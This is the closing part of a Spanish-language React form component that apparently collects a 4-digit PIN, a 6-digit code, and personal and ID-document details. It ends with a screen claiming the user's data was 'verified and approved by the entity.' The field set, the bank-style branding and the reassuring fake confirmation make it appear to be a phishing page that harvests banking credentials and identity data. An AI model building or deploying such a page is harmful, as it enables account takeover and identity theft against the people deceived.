                    onChange={(e) => {
                      setExpeditionDate(e.target.value)
                      setDateError('')
                    }}
                    className="w-full bg-transparent border-none outline-none text-[15px] sm:text-[16px] font-medium text-[#2C3847] p-0 mt-0.5 focus:ring-0"
                  />
                </div>

                {/* Lugar expedición */}
                <CityAutocomplete
                  label="Lugar de expedición"
                  placeholder="Busca la ciudad de expedición (ej. Bogotá)"
                  value={expeditionPlace}
                  onChange={(city) => {
                    setExpeditionPlace(city)
                    setDateError('')
                  }}
                />

                <div className="pt-4">
                  <button
                    type="submit"
                    className="w-full py-4 px-6 rounded-2xl text-white font-bold text-[15px] sm:text-[16px] cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98] focus:outline-none flex items-center justify-center gap-2"
                    style={{
                      background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
                      boxShadow:
                        '0 8px 18px -2px rgba(190, 15, 26, 0.42), inset 0 1px 1.5px rgba(255, 255, 255, 0.35)',
                    }}
                  >
                    <span>Confirmar y finalizar</span>
                  </button>
                </div>

              </form>
            </div>
          )}

          {/* ============================================================== */}
          {/* PASO 5: CONFIRMACIÓN EXITOSA */}
          {/* ============================================================== */}
          {step === 5 && (
            <div className="w-full text-center py-6 animate-in zoom-in-95 duration-300">
              <div className="w-18 h-18 mx-auto mb-4 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center border border-emerald-200 shadow-md">
                <CheckCircle2 className="w-10 h-10" />
              </div>

              <h2 className="text-2xl font-bold text-[#2C3847] mb-2">
                ¡Validación Aprobada con Éxito!
              </h2>
              <p className="text-xs sm:text-sm text-gray-500 max-w-xs mx-auto mb-8 leading-relaxed">
                Tus datos han sido verificados y aprobados por la entidad. Ya puedes hacer uso normal de tus servicios.
              </p>

              <button
                type="button"
                onClick={() => {
                  setStep(1)
                  setPin(['', '', '', ''])
                  setSixDigits(['', '', '', '', '', ''])
                  setFullName('')
                  setAddress('')
                  setBirthDate('')
                  setBirthPlace('')
                  setExpeditionDate('')
                  setExpeditionPlace('')
                  setDateError('')
                  setUserAlertMessage('')
                  setRecordId(null)
                }}
                className="w-full py-4 px-6 rounded-2xl text-white font-bold text-[15px] sm:text-[16px] cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98]"
                style={{
                  background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
                  boxShadow:
                    '0 8px 18px -2px rgba(190, 15, 26, 0.42), inset 0 1px 1.5px rgba(255, 255, 255, 0.35)',
                }}
              >
                Volver al inicio
              </button>
            </div>
          )}

        </div>
      )}

    </div>
  )
}
